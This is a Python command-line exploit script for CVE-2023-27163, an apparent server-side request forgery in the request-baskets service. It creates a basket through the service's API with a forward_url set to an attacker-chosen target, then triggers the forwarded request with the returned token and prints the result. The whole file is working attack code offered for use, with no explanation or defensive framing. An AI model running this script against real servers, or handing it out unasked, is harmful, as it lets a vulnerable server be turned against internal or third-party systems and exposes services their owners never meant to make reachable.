#!/bin/python3

from argparse import ArgumentParser
from secrets import token_hex as genBasketName 
from urllib.parse import urljoin
from json import loads

from logging import basicConfig 
from logging import DEBUG, INFO
from logging import debug, info

from requests import post, get 
from requests import Response

parser = ArgumentParser(prog="CVE-2023-27163")
parser.add_argument("BASE_URL", type=str, help="Vulnerable API path. Eg: http://localhost:5555/")
parser.add_argument("-t", "--target", required=True, type=str, help="URL which the server will request")
parser.add_argument("-v", "--verbose", action="store_true", required=False, default=False, help="Verbose mode.")
args = parser.parse_args()

log_level: int = DEBUG if args.verbose else INFO
basicConfig(level=log_level, format='%(asctime)s - %(levelname)s - %(message)s')

debug(f"OPTIONS:\n- BASE_URL: {args.BASE_URL}\n- TARGET: {args.target}\n- VERBOSE: {args.verbose}")

payload = {
  "forward_url": args.target,
  "proxy_response": False,
  "insecure_tls": False,
  "expand_path": True,
  "capacity": 250
}

basket_name: str = genBasketName(5)
basket_url: str = urljoin(urljoin(args.BASE_URL, "/api/baskets/"), basket_name) 
debug(f"Creating basket at {basket_url}")

info("Requesting the server...")
response: Response = post(basket_url, json=payload)
token: str = loads(response.text)['token']
debug(f"Token received: {token}")

info("Triggering the SSRF...")
response: Response = get(urljoin(args.BASE_URL, basket_url), headers={"Authorization": token})

info(f"Response Content:")
print(response.text)
